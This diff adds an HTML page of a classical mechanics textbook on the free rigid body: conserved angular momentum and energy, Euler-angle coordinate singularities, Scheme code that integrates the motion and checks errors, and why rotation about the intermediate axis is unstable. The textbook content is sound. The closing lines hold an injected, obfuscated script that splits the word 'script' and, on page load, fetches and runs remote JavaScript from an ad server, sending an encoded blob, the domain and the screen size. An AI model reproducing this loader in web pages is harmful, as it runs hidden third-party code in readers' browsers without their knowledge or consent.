@@ -1,0 +1,457 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-28.html">previous</a></span><span>, <a href="book-Z-H-30.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_2.9"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_2.9">2.9&nbsp;&nbsp;Motion of a Free Rigid Body</a></h2>
+<p><a name="%_idx_1228"></a>
+<a name="%_idx_1230"></a><a name="%_idx_1232"></a><a name="%_idx_1234"></a><a name="%_idx_1236"></a>The kinetic energy, expressed in terms of a suitable set of
+generalized coordinates, is a Lagrangian for a free rigid body.  In
+section&nbsp;<a href="book-Z-H-21.html#%_sec_2.1">2.1</a> we found that the kinetic energy of a
+rigid body can be written as the sum of the rotational kinetic energy
+and the translational kinetic energy.  If we choose one set of
+coordinates to specify the position and another set to specify the
+orientation, the Lagrangian becomes a sum of a translational
+Lagrangian and a rotational Lagrangian.  The Lagrange equations for
+translational motion are not coupled to the Lagrange equations for the
+rotational motion.  For a free rigid body the translational motion is
+just that of a free particle: uniform motion.  Here we concentrate on
+the rotational motion of the free rigid body.  We can adopt the Euler
+angles as the coordinates that specify the orientation; the rotational
+kinetic energy was expressed in terms of Euler angles in the previous
+section.</p>
+<p>
+</p>
+<a name="%_sec_Temp_193"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_193">Conserved quantities</a></h4>
+<p>
+The Lagrangian for a free rigid body has no explicit time dependence,
+so we can deduce that the <a name="%_idx_1238"></a><a name="%_idx_1240"></a>energy, which is just the kinetic energy, is
+conserved by the motion.</p>
+<p>
+<a name="%_idx_1242"></a><a name="%_idx_1244"></a>The Lagrangian does not depend on the Euler angle <img src="chap1-Z-G-D-16.gif" border="0">, so we can
+deduce that the momentum conjugate to this coordinate is conserved.
+An explicit expression for the momentum conjugate to <img src="chap1-Z-G-D-16.gif" border="0"> is
+</p>
+<p><tt>(define&nbsp;Euler-state<br>
+&nbsp;&nbsp;(up&nbsp;'t<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'theta&nbsp;'phi&nbsp;'psi)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'thetadot&nbsp;'phidot&nbsp;'psidot)))<br>
+<br>
+(show-expression<br>
+&nbsp;(ref&nbsp;(((partial&nbsp;2)&nbsp;(T-rigid-body&nbsp;'A&nbsp;'B&nbsp;'C))&nbsp;Euler-state)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1))<br>
+</p>
+</tt>
+<p></p>
+<hr>
+
+<p></p>
+<div align=left><img src="chap2-Z-G-59.gif" border="0"></div>
+<p></p>
+<hr>
+
+<p>
+We know that this complicated quantity is conserved by the motion of 
+the rigid body because of the symmetries of the Lagrangian.</p>
+<p>
+If there are no external torques, then we
+expect that the vector angular momentum will be conserved.  We can
+verify this using the Lagrangian formulation of the problem.  First,
+we note that <em>L</em><sub><em>z</em></sub> is the same as <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub>.  We can check this by
+direct calculation:
+</p>
+<p><tt>(print-expression<br>
+&nbsp;(-&nbsp;(ref&nbsp;((Euler-state-&gt;L-space&nbsp;'A&nbsp;'B&nbsp;'C)&nbsp;Euler-state)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(ref&nbsp;(((partial&nbsp;2)&nbsp;(T-rigid-body&nbsp;'A&nbsp;'B&nbsp;'C))&nbsp;Euler-state)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1)))<br>
+;Value:&nbsp;0<br>
+</p>
+</tt>
+<p>We know that <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub> is conserved because the Lagrangian for the free
+rigid body did not mention <img src="chap1-Z-G-D-16.gif" border="0">, so now we know that <em>L</em><sub><em>z</em></sub> is
+conserved.  Since the orientation of the coordinate axes is arbitrary,
+we know that if any rectangular component is conserved then all of
+them are.  So the vector angular momentum is conserved for the free
+rigid body.</p>
+<p>
+<a name="%_idx_1246"></a>We could have seen this with the help of Noether's theorem 
+(see section&nbsp;<a href="book-Z-H-15.html#%_sec_1.8.4">1.8.4</a>).
+There is a continuous family of rotations that can transform any
+orientation into any other orientation.  The orientation of the
+coordinate axes we used to define the Euler angles is arbitrary, and
+the kinetic energy (the Lagrangian) is the same for any choice of
+coordinate system.  Thus the situation meets the requirements of
+Noether's theorem, which tells us that there is a conserved quantity.
+In particular, the family of rotations around each coordinate axis
+gives us conservation of the angular momentum component on that axis.
+We construct the vector angular momentum by combining these
+contributions. </p>
+<p>
+</p>
+<p><a name="%_thm_2.10"></a>
+<b>Exercise 2.10.</b>&nbsp;&nbsp;<strong>Vector angular momentum</strong><br>
+Fill in the details of the argument that Noether's theorem implies
+that vector angular momentum is conserved by the motion of the free
+rigid body.
+</p>
+
+<p></p>
+<p>
+</p>
+<a name="%_sec_2.9.1"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_2.9.1">2.9.1&nbsp;&nbsp;Computing the Motion of Free Rigid Bodies</a></h3>
+<p><a name="%_idx_1248"></a>
+Lagrange's equations for the motion of a free rigid body in terms of
+Euler angles are quite disgusting, so we
+will not show them here.  However, we will use the Lagrange equations
+to explore the motion of the free rigid body.  </p>
+<p>
+<a name="%_idx_1250"></a><a name="%_idx_1252"></a><a name="%_idx_1254"></a>Before doing this it is worth noting that the equations of motion
+in Euler angles are singular for some configurations, because for these
+configurations the Euler angles are not uniquely defined.  If we set
+<img src="chap1-Z-G-D-19.gif" border="0">  =  0 then an orientation does not correspond to a unique value
+of <img src="chap1-Z-G-D-16.gif" border="0"> and <img src="chap1-Z-G-D-56.gif" border="0">; only their sum determines the orientation.</p>
+<p>
+The singularity arises in the explicit Lagrange equations when we
+attempt to solve for the second derivative of the generalized coordinates in
+terms of the generalized coordinates and the generalized velocities
+(see section&nbsp;<a href="book-Z-H-14.html#%_sec_1.7">1.7</a>).  The isolation
+of the second derivative requires multiplying by the inverse of 
+<img src="front-Z-G-D-2.gif" border="0"><sub>2</sub> <img src="front-Z-G-D-2.gif" border="0"><sub>2</sub> <em>L</em>.  The determinant of this quantity
+becomes zero when the Euler angle <img src="chap1-Z-G-D-19.gif" border="0"> is zero:
+</p>
+<p><tt><a name="%_idx_1256"></a>(show-expression<br>
+&nbsp;(determinant&nbsp;<br>
+&nbsp;&nbsp;(((square&nbsp;(partial&nbsp;2))&nbsp;(T-rigid-body&nbsp;'A&nbsp;'B&nbsp;'C))<br>
+&nbsp;&nbsp;&nbsp;Euler-state)))<br>
+</p>
+</tt>
+<p></p>
+<hr>
+
+<p></p>
+<div align=left><img src="chap2-Z-G-60.gif" border="0"></div>
+<p></p>
+<hr>
+
+<p>
+So when <img src="chap1-Z-G-D-19.gif" border="0"> is zero, we cannot solve for the second derivatives.
+When <img src="chap1-Z-G-D-19.gif" border="0"> is small, the Euler angles can move very rapidly, and
+thus may be difficult to compute reliably.  Of course, the motion of
+the rigid body is perfectly well behaved for any orientation.  This is
+a problem of the representation of that motion in Euler angles; it is a
+<a name="%_idx_1258"></a>``coordinate singularity.''</p>
+<p>
+
+One solution to this problem is to use another set of Euler-like
+coordinates for which Lagrange's equations have singularities for
+different orientations, such as those defined in
+equation&nbsp;(<a href="book-Z-H-27.html#EQUATION_2.40">2.40</a>).  So if as the calculation
+proceeds the trajectory comes close to a singularity in one set of coordinates, we can
+switch coordinate systems and use another set for a while until the trajectory encounters another
+singularity.  This solves the problem, but it is cumbersome.  For the
+moment we will ignore this problem and compute some trajectories,
+being careful to limit our attention to trajectories that avoid the
+singularities.  </p>
+<p>
+We will compute some trajectories by numerical integration and check
+our integration process by seeing how well energy and angular momentum
+are conserved.  Then, we will investigate the evolution of the
+components of angular momentum on the principal axis basis.  We will
+discover that we can learn quite a bit about the qualitative behavior
+of rigid bodies by combining the information we get from the energy
+and angular momentum.</p>
+<p>
+To develop a trajectory from initial conditions we integrate the
+Lagrange equations, as we did in chapter&nbsp;<a href="book-Z-H-7.html#%_chap_1">1</a>.
+The system derivative is obtained from the Lagrangian:
+</p>
+<p><tt>(define&nbsp;(rigid-sysder&nbsp;A&nbsp;B&nbsp;C)<br>
+&nbsp;&nbsp;(Lagrangian-&gt;state-derivative&nbsp;(T-rigid-body&nbsp;A&nbsp;B&nbsp;C)))<br>
+</p>
+</tt>
+<p>The following program monitors the errors in the energy and the components
+of the angular momentum:
+</p>
+<p><tt>(define&nbsp;((monitor-errors&nbsp;win&nbsp;A&nbsp;B&nbsp;C&nbsp;L0&nbsp;E0)&nbsp;state)<br>
+&nbsp;&nbsp;(let&nbsp;((t&nbsp;(time&nbsp;state))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(L&nbsp;((Euler-state-&gt;L-space&nbsp;A&nbsp;B&nbsp;C)&nbsp;state))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(E&nbsp;((T-rigid-body&nbsp;A&nbsp;B&nbsp;C)&nbsp;state)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(plot-point&nbsp;win&nbsp;t&nbsp;(relative-error&nbsp;(ref&nbsp;L&nbsp;0)&nbsp;(ref&nbsp;L0&nbsp;0)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(plot-point&nbsp;win&nbsp;t&nbsp;(relative-error&nbsp;(ref&nbsp;L&nbsp;1)&nbsp;(ref&nbsp;L0&nbsp;1)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(plot-point&nbsp;win&nbsp;t&nbsp;(relative-error&nbsp;(ref&nbsp;L&nbsp;2)&nbsp;(ref&nbsp;L0&nbsp;2)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(plot-point&nbsp;win&nbsp;t&nbsp;(relative-error&nbsp;E&nbsp;E0))))<br>
+(define&nbsp;(relative-error&nbsp;value&nbsp;reference-value)<br>
+&nbsp;&nbsp;(if&nbsp;(zero?&nbsp;reference-value)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(error&nbsp;&quot;Zero&nbsp;reference&nbsp;value&nbsp;--&nbsp;RELATIVE-ERROR&quot;)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(/&nbsp;(-&nbsp;value&nbsp;reference-value)&nbsp;reference-value)))<br>
+</p>
+</tt>
+<p>We make a plot window to display the errors:
+</p>
+<p><tt>(define&nbsp;win&nbsp;(frame&nbsp;0.&nbsp;100.&nbsp;-1.e-12&nbsp;1.e-12))<br>
+</p>
+</tt>
+<p><a name="%_idx_1260"></a><a name="%_idx_1262"></a><a name="%_idx_1264"></a><a name="%_idx_1266"></a><a name="%_idx_1268"></a>The default integration method used by the system is Bulirsch-Stoer (<tt>bulirschstoer</tt>), but here we set the integration method to be
+quality-controlled Runge-Kutta (<tt>qcrk4</tt>), because the error plot
+is more interesting:
+</p>
+<p><tt><a name="%_idx_1270"></a>(set!&nbsp;*ode-integration-method*&nbsp;'qcrk4)<br>
+</p>
+</tt>
+<p><a name="%_idx_1272"></a>We use <tt>evolve</tt> to investigate the evolution:
+</p>
+<p><tt>(let&nbsp;((A&nbsp;1.)&nbsp;(B&nbsp;(sqrt&nbsp;2.))&nbsp;(C&nbsp;2.)&nbsp;&nbsp;&nbsp;;&nbsp;moments&nbsp;of&nbsp;inertia<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(state0&nbsp;(up&nbsp;0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;initial&nbsp;state<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;1.&nbsp;0.&nbsp;0.)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;0.1&nbsp;0.1&nbsp;0.1))))<br>
+&nbsp;&nbsp;(let&nbsp;((L0&nbsp;((Euler-state-&gt;L-space&nbsp;A&nbsp;B&nbsp;C)&nbsp;state0))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(E0&nbsp;((T-rigid-body&nbsp;A&nbsp;B&nbsp;C)&nbsp;state0)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;((evolve&nbsp;rigid-sysder&nbsp;A&nbsp;B&nbsp;C)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state0<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(monitor-errors&nbsp;win&nbsp;A&nbsp;B&nbsp;C&nbsp;L0&nbsp;E0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;step&nbsp;between&nbsp;plotted&nbsp;points<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;final&nbsp;time<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.0e-12)))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;max&nbsp;local&nbsp;truncation&nbsp;error<br>
+</p>
+</tt>
+<p>The plot that is developed of the relative errors in the components
+of the angular momenta and the energy (see figure&nbsp;<a href="#FIGURE_2.2">2.2</a>)
+shows that we have been successful in controlling the error in the
+conserved quantities.  This should give us some confidence in the
+trajectory that is evolved.</p>
+<p>
+<a name="FIGURE_2.2"></a></p>
+<div align=left><img src="chap2-Z-G-61.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+<a name="%_sec_2.9.2"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_2.9.2">2.9.2&nbsp;&nbsp;Qualitative Features of Free Rigid Body Motion</a></h3>
+<p></p>
+<p>
+<a name="%_idx_1274"></a><a name="%_idx_1276"></a>The evolution of the components of the angular momentum on the
+principal axes has a remarkable property.  For almost every initial
+condition the body components of the angular momentum periodically trace a
+simple closed curve.</p>
+<p>
+We can see this by investigating a number of trajectories and plotting
+the components of angular momentum of the body on the principal axes
+(see figure&nbsp;<a href="#FIGURE_2.3">2.3</a>).  To make this figure a number of
+trajectories of equal energy were computed.  The three-dimensional
+space of body components is projected onto a two-dimensional plane for
+display.  Points on the back of this projection of the ellipsoid of
+constant energy are plotted with lower density than points on the
+front of the ellipsoid.  For most initial conditions we find a
+one-dimensional simple closed curve.  Some trajectories on the front
+side appear to cross trajectories on the back side, but this is an
+artifact of projection.  There is also a family of trajectories that
+appear to intersect in two points, one on the front side and one on
+the back side.  The curve that is the union of these trajectories is
+called a <a name="%_idx_1278"></a><em>separatrix</em>; it separates different types of motion.</p>
+<p>
+<a name="FIGURE_2.3"></a></p>
+<div align=left><img src="chap2-Z-G-62.gif" border="0"></div>
+<p></p>
+<p>
+What is going on?  The state space for a free rigid body is six-dimensional: 
+the three Euler angles and their time derivatives.  We
+know four constants of the motion -- the three spatial components of
+the angular momentum, <em>L</em><sub><em>x</em></sub>, <em>L</em><sub><em>y</em></sub>, and <em>L</em><sub><em>z</em></sub>, and the energy,&nbsp;<em>E</em>.
+Thus, the motion is restricted to a two-dimensional region of the
+state space.<a name="call_footnote_Temp_195" href="#footnote_Temp_195"><sup><small>9</small></sup></a>  
+Our experiment shows that the components of the angular
+momentum trace one-dimensional closed curves in the angular-momentum
+subspace, so there is something more going on here.</p>
+<p>
+The total angular momentum is
+conserved if all of the components are, so we also have the constant
+<a name="EQUATION_2.56"></a></p>
+<div align=left><img src="chap2-Z-G-63.gif" border="0"></div>
+<p>
+The spatial components of the angular momentum do not change, but of
+course the projections of the angular momentum onto the principal axes
+do change because the axes move as the body moves.  However, the
+magnitude of the angular momentum vector is the same whether it is
+computed from components on the fixed basis or components on the
+principal axis basis.  So, the combination
+<a name="EQUATION_2.57"></a></p>
+<div align=left><img src="chap2-Z-G-64.gif" border="0"></div>
+<p>
+is conserved.  </p>
+<p>
+<a name="%_idx_1280"></a><a name="%_idx_1282"></a><a name="%_idx_1284"></a><a name="%_idx_1286"></a>Using the expressions (<a href="book-Z-H-28.html#EQUATION_2.53">2.53</a>-<a href="book-Z-H-28.html#EQUATION_2.55">2.55</a>) for the angular
+momentum in terms of the components of the angular velocity vector on
+the principal axes, the kinetic
+energy&nbsp;(<a href="book-Z-H-25.html#EQUATION_2.30">2.30</a>) can be rewritten
+in terms of the angular momentum components on the principal
+axes:
+<a name="EQUATION_2.58"></a></p>
+<div align=left><img src="chap2-Z-G-65.gif" border="0"></div>
+<p></p>
+<p>
+
+The two conserved quantities&nbsp;(<a href="#EQUATION_2.57">2.57</a> and
+<a href="#EQUATION_2.58">2.58</a>) provide constraints on how the
+components of the angular momentum vector on the principal axes can
+change.  We recognize the <a name="%_idx_1288"></a>angular momentum
+integral&nbsp;(<a href="#EQUATION_2.57">2.57</a>) as the equation of a sphere, and the
+<a name="%_idx_1290"></a>kinetic energy integral&nbsp;(<a href="#EQUATION_2.58">2.58</a>) as the
+equation for a triaxial ellipsoid.  Both
+integrals are conserved so the components of the angular momentum are
+constrained to move on the intersection of these two surfaces, the
+energy ellipsoid and the angular momentum sphere.  The
+intersection of an ellipsoid and a sphere with the same center is
+generically two closed curves, so an orbit is confined to one of these
+curves.  This sheds light on the puzzle posed at the beginning of this
+section.</p>
+<p>
+Because of our ordering <em>A</em> <u>&lt;</u> <em>B</em> <u>&lt;</u> <em>C</em>, the longest axis of this
+triaxial ellipsoid coincides with the <img src="chap2-Z-G-D-14.gif" border="0"> direction if all
+the angular momentum is along the axis of largest principal moment of
+inertia, and the shortest axis of the energy ellipsoid coincides with
+the hata axis if all the angular momentum is along the
+smallest moment of inertia.  Without actually solving the Lagrange
+equations, we have found strong constraints on the evolution of the
+components of the angular momentum on the principal axes.</p>
+<p>
+To determine how
+the system evolves along these intersection curves we have to use the
+equations of motion.
+We observe that the evolution of the components of the angular
+momentum on the principal axes depends only on the components of the
+angular momentum on the principal axes, even though the values of
+these components are not enough to completely specify the dynamical
+state.  Apparently the dynamics of these components is self-contained,
+and we will see that it can be described in terms of a set of
+differential equations whose only dynamical variables are the
+components of the angular momentum on the principal axes (see section&nbsp;<a href="book-Z-H-32.html#%_sec_2.12">2.12</a>).</p>
+<p>
+We note that there are two axes for which the intersection curves
+shrink to a point if we hold the energy constant and vary the
+magnitude of the angular momentum.  If the angular momentum starts at
+these points, the integrals constrain the angular momentum to stay
+there.  These points are <a name="%_idx_1292"></a><a name="%_idx_1294"></a><a name="%_idx_1296"></a><a name="%_idx_1298"></a><a name="%_idx_1300"></a><em>equilibrium</em> points for the body components
+of the angular momentum.  However, they are not equilibrium
+points for the system as a whole.  At these points the body is still
+rotating even though the body components of the angular momentum are
+not changing.  This kind of equilibrium is
+called a <a name="%_idx_1302"></a><em>relative equilibrium</em>.  We can also see that if the
+angular momentum is initially slightly displaced from one of these
+relative equilibria, then the angular momentum is constrained to stay
+near it on one of the intersection curves.   The angular
+momentum vector is fixed in space, so the principal axis of the
+equilibrium point of the body rotates stably about the angular
+momentum vector.</p>
+<p>
+At the principal axis with intermediate
+moment of inertia, the <img src="chap2-Z-G-D-13.gif" border="0"> axis, the intersection curves cross.
+As we observed, the dynamics of the components of the angular momentum
+on the principal axes forms a self-contained dynamical system.
+Trajectories of a dynamical system cannot cross,<a name="call_footnote_Temp_196" href="#footnote_Temp_196"><sup><small>10</small></sup></a> so the
+most that can happen is that if the equations of motion carry the
+system along the intersection curve then the system can approach the crossing point only
+asymptotically.  So without solving any
+equations we can deduce that the point of crossing is another relative
+equilibrium.  If the angular momentum is initially aligned with the
+intermediate axis, then it stays aligned.  If the system is slightly
+displaced from the intermediate axis, then the evolution along the
+intersection curve will take the system far from the relative
+equilibrium.  So rotation about the axis of intermediate moment of
+inertia is unstable -- initial displacements of the angular momentum,
+however small initially, become large.  Again, the angular momentum
+vector is fixed in space, but now the principal axis with the
+intermediate principal moment does not stay close to the angular
+momentum, so the body executes a complicated tumbling motion.</p>
+<p>
+This gives some insight into the mystery of the thrown <a name="%_idx_1304"></a>book mentioned
+at the beginning of the chapter.  If one throws a book so that it is
+initially rotating about either the axis with the largest moment of inertia or the
+axis with the smallest moment of inertia (the smallest and largest physical axes,
+respectively), the book rotates regularly about that axis.  However,
+if the book is thrown so that it is initially rotating about the axis
+of intermediate moment of inertia (the intermediate physical axis),
+then it tumbles, however carefully it is thrown.  You can
+try it with this book (but put a rubber band or <a name="%_idx_1306"></a>string around it first).</p>
+<p>
+Before moving on, we can make some further physical deductions.
+Suppose a freely rotating body is subject to some sort of <a name="%_idx_1308"></a>internal
+friction that <a name="%_idx_1310"></a>dissipates energy but conserves the angular momentum.
+For example, real bodies flex as they spin.  If the spin axis moves
+with respect to the body then the flexing changes with time, and this
+changing distortion converts kinetic energy of rotation into heat.
+Internal processes do not change the total angular momentum of the
+system.  If we hold the magnitude of the angular momentum fixed but
+gradually decrease the energy, then the curve of intersection on which
+the system moves gradually deforms.  For a given angular momentum
+there is a lower limit on the energy: the energy cannot be so low that
+there are no intersections.  For this lowest energy the intersection
+of the angular momentum sphere and the energy ellipsoid is a pair of
+points on the axis of maximum moment of inertia.  
+With energy dissipation, a freely rotating physical  body
+eventually ends up with the lowest energy consistent with the given
+angular momentum, which is rotation about the principal axis with the
+largest moment of inertia (typically the shortest physical axis).</p>
+<p>
+Thus, we expect that given enough time all freely rotating physical
+bodies will end up rotating about the axis of largest moment of
+inertia.  You can demonstrate this to your satisfaction by twirling a
+small bottle containing some viscous fluid, such as <a name="%_idx_1312"></a>correction fluid.
+What you will find is that, whatever spin you try to put on the
+bottle, it will reorient itself so that the axis of the largest moment
+of inertia is aligned with the spin axis.  Remarkably, this is very
+nearly true of almost every body in the <a name="%_idx_1314"></a><a name="%_idx_1316"></a><a name="%_idx_1318"></a>solar system for which there
+is enough information to decide.  The deviations from principal axis
+rotation for the <a name="%_idx_1320"></a>Earth are tiny: the angle between the angular
+momentum vector and the <img src="chap2-Z-G-D-14.gif" border="0"> axis for the Earth is less than one
+arc-second.<a name="call_footnote_Temp_197" href="#footnote_Temp_197"><sup><small>11</small></sup></a> In fact, the evidence is
+that all of the planets, the
+<a name="%_idx_1322"></a><a name="%_idx_1324"></a>Moon and all the other natural satellites,
+and almost all of the <a name="%_idx_1326"></a>asteroids rotate
+very nearly about the largest moment of inertia.  We have deduced that
+this is to be expected using an elementary argument.  There are
+exceptions.  <a name="%_idx_1328"></a>Comets typically do not
+rotate about the largest moment.  As they are heated by the sun,
+material spews out from localized jets, and the back reaction from
+these jets changes the rotation state.  Among the natural satellites,
+the only known exception is Saturn's satellite
+<a name="%_idx_1330"></a><a name="%_idx_1332"></a>Hyperion, which is tumbling chaotically.  Hyperion is
+especially out of round and subject to strong gravitational torques
+from Saturn.</p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_195" href="#call_footnote_Temp_195"><sup><small>9</small></sup></a> We expect that for each constant of the motion we reduce by
+one the dimension of the region of the state space explored by a
+trajectory.  This is because a constant of the motion can be used locally
+to solve for one of the state variables in terms of the
+others.</p>
+
+<p><a name="footnote_Temp_196" href="#call_footnote_Temp_196"><sup><small>10</small></sup></a> Systems of
+ODEs that satisfy a Lipschitz condition have unique solutions.</p>
+
+<p><a name="footnote_Temp_197" href="#call_footnote_Temp_197"><sup><small>11</small></sup></a> The deviation of the angular momentum from the
+principal axis may be due to a number of effects: earthquakes,
+atmospheric tides, ... .</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-28.html">previous</a></span><span>, <a href="book-Z-H-30.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2wgy0JoorCWU70G0YYUYpkmyw%2bjgAcGiZ9ZgkDhTf1tQhmRkbSQOQf5zWZx6zY%2frcdA7n3YamT9BHRsSBz96jVpaQSkKloRFYvQS0Uc%2blR4L3nU2aLlXnuynGIkmYeLLgtQeWpkNwthF85bi%2b06UKK1MSh4qvZcJOebokHd%2floLhG0vxF5kyJz7P%2bGQK9rxKYzNyy7Dl0X6PMr5tczmBNQxNpwlQJGMX9ealmGbFnLudUTsxiAIB78EQbwpCxX7Ed3QKSh%2fda6BWtYzTBjgJztrISXuIZYcMKn1mAqffqyM3WMp0YlL7NGUVGtmEF5nITkEhof%2fWp1tvtyRPNygc2SF6%2bWFAfo%2fNFRwHHAQBWTlfk6S%2bfYEAjOd3TqFi3WD1p91T%2fmqUcEL9%2fY3ypkUwm4%2fHMaGHWU4T%2fyi58Gwj%2f%2fvagyHIvP4vSqpuDK6Hyhq1eBXdHe5xwLiDEgk3yAq55u");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
